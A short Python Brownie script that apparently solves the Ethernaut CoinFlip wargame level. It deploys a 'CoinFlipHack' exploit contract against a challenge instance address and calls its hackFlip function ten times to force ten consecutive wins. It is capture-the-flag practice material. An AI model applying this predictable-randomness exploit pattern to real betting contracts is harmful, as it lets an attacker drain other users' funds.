from brownie import interface, accounts, config, CoinFlipHack

INSTANCE_ADDRESS = "0x7b4e404563824a938A5e7acA730c6B26c3e51675"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

def hack():
    i = 0
    # grab the Coin Flip contract Object
    instance_contract = interface.ICoinFlip(INSTANCE_ADDRESS)
    # deploy the exploit contract
    exploit_contract = CoinFlipHack.deploy(INSTANCE_ADDRESS, {"from": ACCOUNT})

    # call the exploit function 10 times
    while i < 10:
        tx = exploit_contract.hackFlip({"from": ACCOUNT})
        tx.wait(2)
        i += 1 
    
    print(f"Contract has been hacked. we win {instance_contract.consecutiveWins()} consecutive times")

def main():
    hack()
